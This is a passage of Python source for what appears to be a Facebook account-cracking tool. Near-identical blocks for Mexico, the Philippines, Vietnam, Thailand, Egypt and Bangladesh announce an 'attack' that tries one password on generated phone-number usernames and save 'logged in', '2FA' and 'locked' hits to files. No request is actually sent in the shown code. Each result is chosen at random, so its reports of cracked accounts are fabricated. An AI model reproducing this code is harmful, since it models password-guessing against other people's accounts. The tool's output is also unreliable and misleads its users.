                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def MEX():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Mexico',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(mex)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def PHIL():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Philippines',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(phil)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def VT():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Vietnam',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(vt)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def THAI():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Thailand',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(thai)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def EG():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Egypt',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(eg)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def BD():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Bangladesh',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(bd)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
